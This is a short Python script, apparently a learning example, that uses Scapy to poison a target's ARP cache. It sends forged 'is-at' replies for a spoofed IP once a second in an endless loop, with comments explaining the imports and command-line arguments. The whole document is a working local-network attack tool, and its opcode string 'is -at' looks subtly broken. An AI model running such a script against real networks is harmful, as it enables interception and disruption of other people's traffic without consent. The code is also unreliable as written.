#!/usr/bin/python3

import sys
import time
from scapy.all import sendp , ARP , Ether

# `import sys` imports the sys module, which provides access to some variables 
#  used or maintained by the interpreter and to functions that interact strongly 
#  with the interpreter.
# `import time` imports the time module, which provides various time-related functions.
# `from scapy.all import sendp, ARP, Ether` imports the `sendp`, `ARP`, and `Ether` 
# classes from the Scapy library.

target_ip = sys. argv[1]
fake_ip = sys.argv[2]
iface = sys.argv[3]

# Here we set the target ip, spoofed ip, and network interface according to our CL input

ethernet = Ether()
arp = ARP(pdst=target_ip ,
        psrc=fake_ip ,
        op="is -at")
packet = ethernet / arp

while True:
    sendp(packet , iface=iface)
    time.sleep(1)